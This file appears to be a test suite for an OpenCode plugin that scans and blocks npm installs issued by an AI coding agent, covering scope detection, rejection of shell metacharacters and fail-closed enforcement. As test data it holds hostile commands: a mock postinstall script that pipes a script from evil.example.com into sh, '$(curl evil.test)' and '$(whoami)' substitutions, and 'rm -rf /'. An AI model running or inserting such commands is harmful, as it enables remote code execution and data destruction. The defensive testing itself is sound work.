/**
 * OpenCode npm interception tests.
 *
 * WHAT IS AND IS NOT TESTED HERE
 *
 * These tests exercise the real enforcement path: the real hook module, the
 * real `runPreflight`, the real `parseInstallCommand` and the real `decide`
 * policy. Only the network (registry metadata, tarball, advisory API) and the
 * audit sink are injected.
 *
 * The "hook wiring" block at the bottom drives the actual registered callback
 * with a tool-input object shaped like OpenCode's. That is a *simulated* OpenCode
 * runtime — no OpenCode process is involved — so it proves the wiring and the
 * pass-through guarantee, not that OpenCode itself aborts on a thrown error.
 * Separate live end-to-end runs against a real agent are reported in
 * docs/OPENCODE_PLUGIN.md.
 *
 * No test here spawns npm, and the malicious fixture is never executed.
 */

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { describe, it } from "node:test";

import {
  classifyCommand,
  extractShellCommand,
  SHELL_TOOL_NAMES,
  UNVERIFIABLE_INSTALL_SUBCOMMANDS,
} from "../lib/firewall/agent-command.ts";
import { splitCommandString, CommandRejected } from "../lib/firewall/parse-command.ts";
import { runPreflight } from "../lib/firewall/preflight.ts";
import { buildTarball, maliciousFixture, safeFixture, type FixtureFile } from "./fixtures.ts";
import plugin, { enforceCommand } from "../.opencode/plugins/d0-npm-guard.ts";

import type { FirewallEvent } from "../lib/scanner/types.ts";
import type { ScanDeps } from "../lib/scanner/scan.ts";

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                    */
/* -------------------------------------------------------------------------- */

const OPTS = { timeoutMs: 5000, disabled: false };

/**
 * Collects audit events instead of writing to the real store.
 *
 * Without this the suite would append its own scans to the production audit
 * trail, making a test run indistinguishable from genuine enforcement history.
 */
const NOOP_AUDIT = async () => {};

function sha256(b: Buffer): string {
  return createHash("sha256").update(b).digest("hex");
}

/**
 * A mock npm registry serving metadata and a real gzipped tarball.
 *
 * `advisories` controls the security verdict: a critical advisory drives BLOCK,
 * a high one drives REVIEW, and none drives ALLOW.
 */
function mockRegistry(opts: {
  name: string;
  version?: string;
  files: FixtureFile[];
  /** Declared in registry metadata, as npm really serves it. */
  scripts?: Record<string, string>;
  advisories?: unknown[];
  advisoryFails?: boolean;
  tarballFails?: boolean;
}) {
  const version = opts.version ?? "1.0.0";
  const tarball = buildTarball(opts.files);
  const dist: Record<string, unknown> = {
    tarball: "https://registry.npmjs.org/x/-/x.tgz",
    integrity: `sha512-${createHash("sha512").update(tarball).digest("base64")}`,
  };
  const meta = Buffer.from(
    JSON.stringify({
      "dist-tags": { latest: version },
      versions: {
        [version]: {
          name: opts.name,
          version,
          dist,
          ...(opts.scripts ? { scripts: opts.scripts } : {}),
        },
      },
    }),
    "utf8",
  );

  const fetchImpl = async (url: string) => {
    if (url.includes("/-/")) {
      if (opts.tarballFails) throw Object.assign(new Error("simulated registry timeout"), { code: "DZ_HTTP_TIMEOUT" });
      return { bytes: tarball, sha256: sha256(tarball), finalUrl: url, status: 200 };
    }
    return { bytes: meta, sha256: sha256(meta), finalUrl: url, status: 200 };
  };

  const advisoriesImpl = async () => {
    if (opts.advisoryFails) {
      return { state: "unavailable" as const, vulnerabilities: [], error: "simulated OSV outage" };
    }
    return { state: "checked" as const, vulnerabilities: (opts.advisories ?? []) as never };
  };

  return {
    fetchImpl: fetchImpl as never,
    advisoriesImpl: advisoriesImpl as never,
  };
}

const SAFE_DEPS = (): ScanDeps =>
  mockRegistry({ name: "d0-safe-fixture", files: safeFixture() }) as ScanDeps;

/**
 * A package that produces a hard BLOCK verdict.
 *
 * `maliciousFixture()` is DATA ONLY: it is parsed as bytes by the detectors and
 * matched by regex. Nothing in this file executes it.
 */
const VULN_DEPS = (): ScanDeps =>
  mockRegistry({
    name: "d0-vuln-fixture",
    files: maliciousFixture(),
    scripts: { postinstall: "curl -s https://evil.example.com/p.sh | sh" },
  }) as ScanDeps;

const REVIEW_DEPS = (): ScanDeps =>
  mockRegistry({ name: "d0-review-fixture", files: safeFixture(), advisories: [
    { id: "GHSA-test-critical", source: "OSV", url: "https://example.test/a", summary: "critical", severity: "critical" },
  ] }) as ScanDeps;

const OUTAGE_DEPS = (): ScanDeps =>
  mockRegistry({ name: "d0-outage-fixture", files: safeFixture(), advisoryFails: true }) as ScanDeps;

/** Capture audit events instead of writing to the real store. */
function auditCollector() {
  const events: FirewallEvent[] = [];
  return { events, sink: async (e: FirewallEvent) => { events.push(e); } };
}

/* -------------------------------------------------------------------------- */
/* Scope detection                                                             */
/* -------------------------------------------------------------------------- */

describe("scope detection", () => {
  it("treats explicit installs as in scope", () => {
    for (const cmd of [
      "npm install axios",
      "npm i axios@1.7.2",
      "npm install --save-dev left-pad",
      "npm add lodash@4.17.15",
      "npm",
      "npm -g",
      "npm install",
    ]) {
      assert.equal(classifyCommand(cmd).inScope, true, cmd);
    }
  });

  it("treats non-install npm commands as out of scope", () => {
    for (const cmd of [
      "npm run build",
      "npm test",
      "npm run-script lint",
      "npm view axios",
      "npm outdated",
      "npm ls",
      "npm audit",
      "npm publish",
      "npm config get registry",
    ]) {
      assert.equal(classifyCommand(cmd).inScope, false, cmd);
    }
  });

  it("ignores commands that never mention npm", () => {
    for (const cmd of ["git status", "ls -la", "node build.js", "python -m pytest", "pnpm install x"]) {
      assert.equal(classifyCommand(cmd).inScope, false, cmd);
    }
  });

  it("catches an install hidden behind a chain, because the scope test is textual", () => {
    // The command is in scope; the metacharacter rejection happens next.
    assert.equal(classifyCommand("echo hi; npm install evil").inScope, true);
    assert.equal(classifyCommand("npm install evil && rm -rf /").inScope, true);
  });

  it("treats an unknown subcommand as in scope rather than guessing", () => {
    assert.equal(classifyCommand("npm frobnicate pkg").inScope, true);
    assert.equal(classifyCommand("npm --save left-pad").inScope, true);
  });

  it("ignores commands where npm is only text, not an invocation", () => {
    // Regression guard: matching the literal word "npm" anywhere would drag
    // ordinary code searching into the enforcement path and block it.
    for (const cmd of [
      'grep "npm install" src/',
      "grep npm install src/",
      "echo npm install",
      'Select-String "npm" package.json',
    ]) {
      assert.equal(classifyCommand(cmd).inScope, false, cmd);
    }
  });

  it("recognises npm invoked through an absolute path", () => {
    assert.equal(classifyCommand("/usr/bin/npm install x").inScope, true);
    assert.equal(classifyCommand("C:\\tools\\npm.cmd install x").inScope, true);
    // A path containing a space splits into two tokens; the pathed token still
    // carries the npm basename, so the command stays in scope.
    assert.equal(classifyCommand("C:\\Program Files\\nodejs\\npm.cmd install x").inScope, true);
  });

  it("recognises npm behind a shell separator or an env prefix", () => {
    assert.equal(classifyCommand("cd /tmp && npm install evil").inScope, true);
    assert.equal(classifyCommand("echo hi; npm install evil").inScope, true);
    assert.equal(classifyCommand("$(npm install evil)").inScope, true);
    assert.equal(classifyCommand("NODE_ENV=prod npm install x").inScope, true);
  });

  it("flags unresolvable input as out of scope instead of throwing", () => {
    assert.equal(classifyCommand(undefined).inScope, false);
    assert.equal(classifyCommand(42).inScope, false);
    assert.equal(classifyCommand(null).inScope, false);
  });

  it("knows which installs it cannot pre-verify", () => {
    assert.ok(UNVERIFIABLE_INSTALL_SUBCOMMANDS.has("ci"));
    assert.ok(UNVERIFIABLE_INSTALL_SUBCOMMANDS.has("update"));
    assert.ok(!UNVERIFIABLE_INSTALL_SUBCOMMANDS.has("install"));
  });
});

/* -------------------------------------------------------------------------- */
/* Tool input extraction                                                       */
/* -------------------------------------------------------------------------- */

describe("tool input extraction", () => {
  it("accepts both known shell tool names", () => {
    assert.ok(SHELL_TOOL_NAMES.has("shell"));
    assert.ok(SHELL_TOOL_NAMES.has("bash"));
    assert.equal(extractShellCommand("bash", { command: "npm install x" }), "npm install x");
  });

  it("ignores non-shell tools so unrelated work is never blocked", () => {
    assert.equal(extractShellCommand("read", { command: "npm install x" }), null);
    assert.equal(extractShellCommand("edit", { filePath: "npm install x" }), null);
    assert.equal(extractShellCommand("grep", { pattern: "npm" }), null);
  });

  it("ignores a shape it does not understand", () => {
    assert.equal(extractShellCommand("bash", null), null);
    assert.equal(extractShellCommand("bash", {}), null);
    assert.equal(extractShellCommand("bash", { command: 123 }), null);
    assert.equal(extractShellCommand("bash", { cmd: "npm install x" }), null);
  });
});

/* -------------------------------------------------------------------------- */
/* Command string splitting                                                    */
/* -------------------------------------------------------------------------- */

describe("command string splitting", () => {
  it("splits a plain command on whitespace", () => {
    assert.deepEqual(splitCommandString("npm install left-pad"), ["npm", "install", "left-pad"]);
  });

  it("refuses every shell construct rather than interpreting it", () => {
    const hostile = [
      "npm install a; rm -rf /",
      "npm install a && echo done",
      "npm install a | tee log",
      "npm install $(whoami)",
      "npm install `whoami`",
      "npm install a > out.txt",
      "npm install a < in.txt",
      "npm install 'quoted'",
      'npm install "quoted"',
      "npm install a\nnpm install b",
      "npm install ../escape",
      "npm install a || echo fail",
    ];
    for (const cmd of hostile) {
      assert.throws(() => splitCommandString(cmd), CommandRejected, cmd);
    }
  });

  it("refuses an empty command", () => {
    assert.throws(() => splitCommandString(""), CommandRejected);
    assert.throws(() => splitCommandString("    "), CommandRejected);
  });
});

/* -------------------------------------------------------------------------- */
/* Enforcement                                                                 */
/* -------------------------------------------------------------------------- */

describe("enforcement", () => {
  it("BLOCKS a vulnerable package before execution", async () => {
    await assert.rejects(
      () => enforceCommand("npm install d0-vuln-fixture@1.0.0", OPTS, VULN_DEPS(), NOOP_AUDIT),
      (e: Error) => /BLOCK/.test(e.message) && /was NOT run/.test(e.message),
    );
  });

  it("permits a safe package, leaving the command untouched", async () => {
    const before = "npm install d0-safe-fixture@1.0.0";
    await enforceCommand(before, OPTS, SAFE_DEPS(), NOOP_AUDIT);
    // Nothing to assert about a no-op except that it did not throw.
  });

  it("HOLDS a REVIEW verdict instead of installing", async () => {
    await assert.rejects(
      () => enforceCommand("npm install d0-review-fixture@1.0.0", OPTS, REVIEW_DEPS(), NOOP_AUDIT),
      (e: Error) => /REVIEW/.test(e.message),
    );
  });

  it("fails closed when the scanner cannot produce a verdict", async () => {
    await assert.rejects(
      () => enforceCommand("npm install d0-outage-fixture@1.0.0", OPTS, OUTAGE_DEPS(), NOOP_AUDIT),
      (e: Error) => /SCANNER_UNAVAILABLE/.test(e.message) || /REVIEW/.test(e.message),
    );
  });

  it("fails closed when the tarball cannot be fetched", async () => {
    const deps = mockRegistry({ name: "x", files: safeFixture(), tarballFails: true }) as ScanDeps;
    await assert.rejects(() => enforceCommand("npm install x@1.0.0", OPTS, deps, NOOP_AUDIT));
  });

  it("fails closed when the registry is unreachable", async () => {
    const deps: ScanDeps = {
      fetchImpl: (async () => { throw Object.assign(new Error("registry down"), { code: "DZ_HTTP_TIMEOUT" }); }) as never,
      advisoriesImpl: (async () => ({ state: "checked", vulnerabilities: [] })) as never,
    };
    await assert.rejects(() => enforceCommand("npm install left-pad", OPTS, deps, NOOP_AUDIT));
  });

  it("rejects chained and substituted installs", async () => {
    for (const cmd of [
      "npm install d0-vuln-fixture@1.0.0 && echo pwned",
      "npm install $(curl evil.test)",
      "npm install d0-vuln-fixture@1.0.0; rm -rf /",
    ]) {
      await assert.rejects(
        () => enforceCommand(cmd, OPTS, SAFE_DEPS(), NOOP_AUDIT),
        /shell metacharacters/,
        cmd,
      );
    }
  });

  it("rejects installs it cannot verify ahead of time", async () => {
    for (const cmd of ["npm ci", "npm update", "npm upgrade"]) {
      await assert.rejects(
        () => enforceCommand(cmd, OPTS, SAFE_DEPS(), NOOP_AUDIT),
        /cannot verify before it runs/,
        cmd,
      );
    }
  });

  it("rejects unsupported npm subcommands that reach enforcement", async () => {
    // These are in scope but outside the guarded surface.
    await assert.rejects(() => enforceCommand("npm exec evil", OPTS, SAFE_DEPS(), NOOP_AUDIT));
  });

  it("rejects npx, which runs arbitrary packages by design", async () => {
    await assert.rejects(() => enforceCommand("npx evil-pkg", OPTS, SAFE_DEPS(), NOOP_AUDIT));
  });
});

/* -------------------------------------------------------------------------- */
/* Preflight contract                                                          */
/* -------------------------------------------------------------------------- */

describe("preflight never executes npm", () => {
  it("records npmExecuted false on ALLOW", async () => {
    const { events, sink } = auditCollector();
    const r = await runPreflight({
      argv: ["npm", "install", "d0-safe-fixture@1.0.0"],
      source: "opencode-plugin",
      deps: SAFE_DEPS(),
      audit: sink,
    });

    assert.equal(r.outcome, "ALLOW");
    assert.equal(r.permit, true);
    assert.equal(events.length, 1);
    assert.equal(events[0].npmExecuted, false);
    assert.equal(events[0].source, "opencode-plugin");
  });

  it("records npmExecuted false on BLOCK too", async () => {
    const { events, sink } = auditCollector();
    const r = await runPreflight({
      argv: ["npm", "install", "d0-vuln-fixture@1.0.0"],
      source: "opencode-plugin",
      deps: VULN_DEPS(),
      audit: sink,
    });

    assert.equal(r.outcome, "BLOCK");
    assert.equal(r.permit, false);
    assert.equal(events[0].npmExecuted, false);
    assert.equal(events[0].action, "BLOCKED_BEFORE_EXECUTION");
  });

  it("writes an audit event for a rejected command without scanning", async () => {
    const { events, sink } = auditCollector();
    const r = await runPreflight({
      argv: ["npm", "install", "a; rm -rf /"],
      source: "opencode-plugin",
      deps: SAFE_DEPS(),
      audit: sink,
    });

    assert.equal(r.outcome, "COMMAND_REJECTED");
    assert.equal(r.permit, false);
    assert.equal(r.scanIds.length, 0, "a rejected command must not be scanned");
    assert.equal(events.length, 1);
  });

  it("does not change the decision when the audit write fails", async () => {
    const r = await runPreflight({
      argv: ["npm", "install", "d0-safe-fixture@1.0.0"],
      source: "opencode-plugin",
      deps: SAFE_DEPS(),
      audit: async () => { throw new Error("store locked"); },
    });
    assert.equal(r.permit, true, "an audit failure must not deny a safe install");
  });

  it("never permits when the outcome is not ALLOW", async () => {
    for (const [name, deps] of [
      ["vuln", VULN_DEPS()],
      ["review", REVIEW_DEPS()],
      ["outage", OUTAGE_DEPS()],
    ] as const) {
      const r = await runPreflight({
        argv: ["npm", "install", "d0-vuln-fixture@1.0.0"],
        source: "opencode-plugin",
        deps,
        audit: async () => {},
      });
      assert.equal(r.permit, false, name);
    }
  });
});

/* -------------------------------------------------------------------------- */
/* Hook wiring — SIMULATED OpenCode runtime                                     */
/* -------------------------------------------------------------------------- */

/**
 * Drive the plugin's real `setup` and invoke the hook it registers, with a tool
 * input shaped like OpenCode's.
 *
 * This is a simulation of the OpenCode hook contract, not a real agent run. It
 * proves the wiring, the scope gate, the fail-closed behaviour and — critically
 * — that an ALLOW leaves the input byte-for-byte unmodified so the original
 * command runs exactly once.
 */
function harness(options?: Record<string, unknown>) {
  const registered: { name: string; cb: (e: never) => Promise<void> | void }[] = [];
  // Every harness run collects its audit events rather than writing them to the
  // real store, so driving the hook in a test cannot corrupt enforcement history.
  const events: FirewallEvent[] = [];

  const ctx = {
    tool: {
      hook: async (name: string, cb: never) => {
        registered.push({ name, cb });
        return { dispose: async () => {} };
      },
    },
    location: { directory: process.cwd() },
    options: { audit: async (e: FirewallEvent) => { events.push(e); }, ...options },
  };

  return {
    registered,
    events,
    async run(tool: string, input: Record<string, unknown>) {
      const event = { tool, input };
      const cb = registered[0].cb as unknown as (e: typeof event) => Promise<void>;
      await cb(event);
      return event;
    },
    async setup() {
      await plugin.setup(ctx as never);
    },
  };
}

describe("hook wiring (simulated OpenCode runtime)", () => {
  it("registers exactly one execute.before hook", async () => {
    const h = harness();
    await h.setup();
    assert.equal(h.registered.length, 1);
    assert.equal(h.registered[0].name, "execute.before");
  });

  it("exposes a stable plugin id", () => {
    assert.equal(plugin.id, "dependency-zero.npm-guard");
  });

  it("leaves an unrelated shell command completely untouched", async () => {
    const h = harness();
    await h.setup();
    const event = await h.run("bash", { command: "git status" });
    assert.equal(event.input.command, "git status");
  });

  it("leaves a non-shell tool untouched even when it mentions npm", async () => {
    const h = harness();
    await h.setup();
    const event = await h.run("grep", { pattern: "npm install axios" });
    assert.deepEqual(event.input, { pattern: "npm install axios" });
  });

  it("throws for a vulnerable install (BLOCK before execution)", async () => {
    const h = harness();
    await h.setup();
    await assert.rejects(
      () => h.run("bash", { command: "npm install axios@1.7.2" }),
      /DEPENDENCY ZERO/,
    );
    assert.equal(h.events.length, 1, "the decision must be audited");
    assert.equal(h.events[0].action, "BLOCKED_BEFORE_EXECUTION");
    assert.equal(h.events[0].npmExecuted, false, "the plugin must never spawn npm");
    assert.equal(h.events[0].source, "opencode-plugin");
  });

  it("writes no audit event for a command it never inspects", async () => {
    const h = harness();
    await h.setup();
    await h.run("bash", { command: "git status" });
    assert.equal(h.events.length, 0);
  });

  it("can be disabled by option, and then allows everything", async () => {
    const h = harness({ disabled: true });
    await h.setup();
    const event = await h.run("bash", { command: "npm install axios@1.7.2" });
    assert.equal(event.input.command, "npm install axios@1.7.2");
  });

  it("accepts a positive timeout option", async () => {
    const h = harness({ timeoutMs: 1234 });
    await h.setup();
    assert.equal(h.registered.length, 1);
  });
});

/* -------------------------------------------------------------------------- */
/* Fail-closed guarantee                                                       */
/* -------------------------------------------------------------------------- */

/** Every network call fails. Used to prove the guard cannot fail open. */
const BROKEN_DEPS: ScanDeps = {
  fetchImpl: (async () => { throw new Error("boom"); }) as never,
  advisoriesImpl: (async () => { throw new Error("boom"); }) as never,
};

describe("fail closed", () => {
  it("never returns a permissive result for an in-scope command it cannot scan", async () => {
    let resolved = false;
    try {
      await enforceCommand("npm install left-pad", OPTS, BROKEN_DEPS, NOOP_AUDIT);
      resolved = true;
    } catch {
      /* expected */
    }
    assert.equal(resolved, false, "a throwing scanner must never result in permission");
  });

  it("reports a scanner malfunction as a block, not as a silent pass", async () => {
    let caught: Error | null = null;
    try {
      await enforceCommand("npm install left-pad", OPTS, BROKEN_DEPS, NOOP_AUDIT);
    } catch (e) {
      caught = e as Error;
    }
    assert.ok(caught, "must not resolve");
    assert.match(caught.message, /was NOT run/);
  });
});